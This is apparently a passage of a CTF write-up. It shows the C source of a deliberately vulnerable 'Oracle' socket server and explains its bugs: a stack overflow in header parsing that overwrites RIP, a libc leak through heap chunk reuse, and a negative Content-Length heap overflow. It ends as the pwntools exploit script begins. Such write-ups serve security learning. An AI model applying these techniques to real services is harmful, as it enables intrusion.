</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PORT                    9001
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_START_LINE_SIZE     1024
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_PLAGUE_CONTENT_SIZE 2048
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_HEADER_DATA_SIZE    1024
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_HEADERS             8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_HEADER_LENGTH       128
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define VIEW                    &#34;VIEW&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PLAGUE                  &#34;PLAGUE&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BAD_REQUEST             &#34;400 Bad Request - you can only view competitors or plague them. What else would you want to do?\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PLAGUING_YOURSELF       &#34;You tried to plague yourself. You cannot take the easy way out.\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PLAGUING_OVERLORD       &#34;You have committed the greatest of sins. Eternal damnation awaits.\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define NO_COMPETITOR           &#34;No such competitor %s exists. They may have fallen before you tried to plague them. Attempted plague: &#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CONTENT_LENGTH_NEEDED   &#34;You need to specify the length of your plague description. How else can I help you?\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RANDOMISING_TARGET      &#34;Randomising a target competitor, as you wish...\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> PlagueHeader {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> key[MAX_HEADER_LENGTH];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> value[MAX_HEADER_LENGTH];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> PlagueHeader headers[MAX_HEADERS];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> client_socket;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> action[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> target_competitor[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> version[<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handle_request</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handle_view</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handle_plague</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">parse_headers</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">get_header</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">is_competitor</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> server_socket <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (server_socket <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Failed to create socket!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set up the server address struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> sockaddr_in server_address;
</span></span><span style="display:flex;"><span>    server_address.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    server_address.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;
</span></span><span style="display:flex;"><span>    server_address.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(PORT);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Bind the socket to the specified address and port
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bind</span>(server_socket, (<span style="color:#66d9ef">struct</span> sockaddr<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server_address, <span style="color:#66d9ef">sizeof</span>(server_address)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Socket binding failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(server_socket);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Listen for incoming connections
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">listen</span>(server_socket, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Socket listening failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(server_socket);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Oracle listening on port %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, PORT);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        client_socket <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(server_socket, NULL, NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Received a spiritual connection...&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (client_socket <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Socket accept failed&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">handle_request</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handle_request</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// take in the start-line of the request
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// contains the action, the target competitor and the oracle version
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> start_line[MAX_START_LINE_SIZE];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> byteRead;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ssize_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">ssize_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> MAX_START_LINE_SIZE; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">recv</span>(client_socket, <span style="color:#f92672">&amp;</span>byteRead, <span style="color:#66d9ef">sizeof</span>(byteRead), <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (start_line[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\r&#39;</span> <span style="color:#f92672">&amp;&amp;</span> byteRead <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>            start_line[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        start_line[i] <span style="color:#f92672">=</span> byteRead;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sscanf</span>(start_line, <span style="color:#e6db74">&#34;%7s %31s %15s&#34;</span>, action, target_competitor, version);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">parse_headers</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// handle the specific action desired
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(action, VIEW)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">handle_view</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(action, PLAGUE)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">handle_plague</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;ERROR: Undefined action!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, BAD_REQUEST, <span style="color:#a6e22e">strlen</span>(BAD_REQUEST));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// clear all request-specific values for next request
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memset</span>(action, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(target_competitor, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(version, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(headers, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(headers));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handel_view</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(target_competitor, <span style="color:#e6db74">&#34;me&#34;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, <span style="color:#e6db74">&#34;You have found yourself.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">25</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_competitor</span>(target_competitor)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, <span style="color:#e6db74">&#34;No such competitor exists.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">27</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, <span style="color:#e6db74">&#34;It has been imprinted upon your mind.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">38</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handle_plague</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">get_header</span>(<span style="color:#e6db74">&#34;Content-Length&#34;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, CONTENT_LENGTH_NEEDED, <span style="color:#a6e22e">strlen</span>(CONTENT_LENGTH_NEEDED));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// take in the data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>plague_content <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(MAX_PLAGUE_CONTENT_SIZE);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>plague_target <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">get_header</span>(<span style="color:#e6db74">&#34;Plague-Target&#34;</span>)) {
</span></span><span style="display:flex;"><span>        plague_target <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strncpy</span>(plague_target, <span style="color:#a6e22e">get_header</span>(<span style="color:#e6db74">&#34;Plague-Target&#34;</span>), <span style="color:#ae81ff">0x1f</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, RANDOMISING_TARGET, <span style="color:#a6e22e">strlen</span>(RANDOMISING_TARGET));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(<span style="color:#a6e22e">get_header</span>(<span style="color:#e6db74">&#34;Content-Length&#34;</span>), len, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;=</span> MAX_PLAGUE_CONTENT_SIZE) {
</span></span><span style="display:flex;"><span>        len <span style="color:#f92672">=</span> MAX_PLAGUE_CONTENT_SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">recv</span>(client_socket, plague_content, len, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(target_competitor, <span style="color:#e6db74">&#34;me&#34;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, PLAGUING_YOURSELF, <span style="color:#a6e22e">strlen</span>(PLAGUING_YOURSELF));
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_competitor</span>(target_competitor)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(client_socket, PLAGUING_OVERLORD, <span style="color:#a6e22e">strlen</span>(PLAGUING_OVERLORD));
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dprintf</span>(client_socket, NO_COMPETITOR, target_competitor);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">write</span>(client_socket, plague_content, len);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">write</span>(client_socket, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(plague_content);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (plague_target) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(plague_target);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">parse_headers</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// first input all of the header fields
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">ssize_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> byteRead;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> header_buffer[MAX_HEADER_DATA_SIZE];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">recv</span>(client_socket, <span style="color:#f92672">&amp;</span>byteRead, <span style="color:#66d9ef">sizeof</span>(byteRead), <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// clean up the headers by removing extraneous newlines
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(byteRead <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">&amp;&amp;</span> header_buffer[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\r&#39;</span>))
</span></span><span style="display:flex;"><span>            header_buffer[i] <span style="color:#f92672">=</span> byteRead;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(<span style="color:#f92672">&amp;</span>header_buffer[i<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>], <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>)) {
</span></span><span style="display:flex;"><span>            header_buffer[i<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// now parse the headers
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>delim <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>line <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(header_buffer, delim);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ssize_t</span> num_headers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (line <span style="color:#f92672">!=</span> NULL <span style="color:#f92672">&amp;&amp;</span> num_headers <span style="color:#f92672">&lt;</span> MAX_HEADERS) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>colon <span style="color:#f92672">=</span> <span style="color:#a6e22e">strchr</span>(line, <span style="color:#e6db74">&#39;:&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (colon <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>colon <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strncpy</span>(headers[num_headers].key, line, MAX_HEADER_LENGTH);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strncpy</span>(headers[num_headers].value, colon<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, MAX_HEADER_LENGTH);        <span style="color:#75715e">// colon+2 to remove whitespace
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            
</span></span><span style="display:flex;"><span>            num_headers<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        line <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(NULL, delim);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">get_header</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>header_name) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// return the value for a specific header key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">ssize_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> MAX_HEADERS; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(headers[i].key, header_name)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> headers[i].value;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">is_competitor</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// don&#39;t want the user of the Oracle to be able to plague Overlords!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(name, <span style="color:#e6db74">&#34;Overlord&#34;</span>, <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="initial-analysis">Initial-Analysis<a href="#initial-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>The program creates a socket and binds it to port 9001</li>
<li>It then parses headers using parse_headers() and request handling using handle_requests()</li>
<li>the program has limited functionality where in we view competitiors or plague who have handle_view and handle_plague handlers respectively.</li>
</ul>
<h3 id="bugs">Bugs<a href="#bugs" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>so we have a buffer overflow in the parse_headers() function where it keeps reading from the client socket until a &ldquo;\r\n\r\n&rdquo; is recvieved to a fixed size buffer of 1024 bytes. The program doesnt have stack canaries enabled so we can just overwrite RIP.</p>
<p><em><strong>Leak ?</strong></em></p>
<p>so we can get a libc leak by creating a chunk of size 2000 freeing it allocating the same chunk again but this this we will have a libc pointer in this chunk .There is also a interger overflow vuln in the plague function when we parse the header <code>content-Length</code> we store a unsigned long in a signed long &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>plague_content <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(MAX_PLAGUE_CONTENT_SIZE);
</span></span><span style="display:flex;"><span>    ....
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(<span style="color:#a6e22e">get_header</span>(<span style="color:#e6db74">&#34;Content-Length&#34;</span>), len, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>    ....
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;=</span> MAX_PLAGUE_CONTENT_SIZE) {
</span></span><span style="display:flex;"><span>        len <span style="color:#f92672">=</span> MAX_PLAGUE_CONTENT_SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">recv</span>(client_socket, plague_content, len, <span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><p>if we send Content-Length as <code>-1</code> we can bypass the check can get a heap overflow .</p>
<p>i dont use this bug in my exploit but i think this was a unintentional bug .</p>
<h3 id="exploit-strategy-1">Exploit Strategy<a href="#exploit-strategy-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The primitives given above can be used to leak libc address and also to get a ropchain going.</p>
<ul>
<li>
<p>We create a chunk of 2000 bytes in the heap and write 2000bytes to it  with 1 connection then we again create a 2000 bytes chunk but this time only writing 1byte to the buffer this will give us two pointers to libc in our handle_plague() output .</p>
</li>
<li>
<p>We can create another connection to exploit the buffer overflow in the parse_headers function.</p>
</li>
<li>
<p>profit !!!!</p>
</li>
</ul>
<h3 id="initial-exploit">Initial Exploit<a href="#initial-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
